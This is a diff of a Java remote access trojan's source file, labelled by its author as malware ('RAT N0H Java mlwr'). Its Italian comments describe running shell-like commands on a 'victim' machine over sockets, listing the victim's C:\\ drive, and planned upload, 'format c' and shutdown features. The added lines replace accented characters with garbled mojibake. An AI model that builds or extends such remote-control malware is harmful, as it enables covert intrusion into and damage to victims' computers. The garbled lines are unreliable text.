@@ -3,20 +3,17 @@ package src;
 /*
  * RAT N0H Java mlwr v b 0.4
  * 
- * nei successivi ritocchi dovrò imlpementare file explorer ecc..
+ * nei successivi ritocchi dovrÃ² imlpementare file explorer ecc..
  * per adesso ho aggiunto un nuovo thread con un propio flusso in/out
- * per adesso il flusso del thread è solo out dal client e in dal server (posso solo ricevere dal client)
- * ma la funzione non è ancora un file transfer vero e propio 
- * per adesso stampo solamente la directori c:// della vittima) .
- * 
- * e non viceversa , nelle successive versioni implementerò la funzione 
+ * per adesso il flusso del thread Ã¨ solo out dal client e in dal server (posso solo ricevere dal client)
+ * . nelle successive versioni implementerÃ² la funzione 
  * in out sia server che client 
  * cosi da poter anche usufruire della funzione di upoload
  * 
  * 
- * nelle versioni successive dovrò aggiungere la funzione 
+ * nelle versioni successive dovrÃ² aggiungere la funzione 
  * format c
- * shutdown ecc     //roba da lamer che penso non inserirò sinceramente!!
+ * shutdown ecc     //roba da lamer che penso non inserirÃ² sinceramente!!
  * easy job
  *
  * N0H  N0H  N0H  N0H  N0H  N0H  N0H  N0H  N0H  N0H  N0H  N0H  N0H  N0H 
@@ -68,11 +65,11 @@ public static DefaultListModel<String> dlm;
 	static ServerSocket WCSSock;
 	static ServerSocket fTSock;
 	static ServerSocket FTsock;
-	// variabile del metodo che è ancora da implementare
+	// variabile del metodo che Ã¨ ancora da implementare
 	boolean chatIsVisible = false;
 
 	static int vlistid = 0;
-	// qui suddividerò in final tutte le string
+	// qui suddividerÃ² in final tutte le string
 	// per mandare comandi al server
 	// tramite flusso in out del socket, con le string e
 	// con condizioni booleane, che mi permetterano
@@ -85,7 +82,7 @@ public static DefaultListModel<String> dlm;
 	// comandi al server(in questo caso il client) like a shell xD
 	// it works :D
 	/*
-	 * per adesso il metodo descritto sopra è l'unico che conosco per far eseguire
+	 * per adesso il metodo descritto sopra Ã¨ l'unico che conosco per far eseguire
 	 * comandi al client over network, oviamente i metodi sono istanziati nel client
 	 * e poi vengono richiamati tramite stringe, cosi che il flusso in/out del
 	 * client e del server non funga da sola chat ma anche da stream che attende
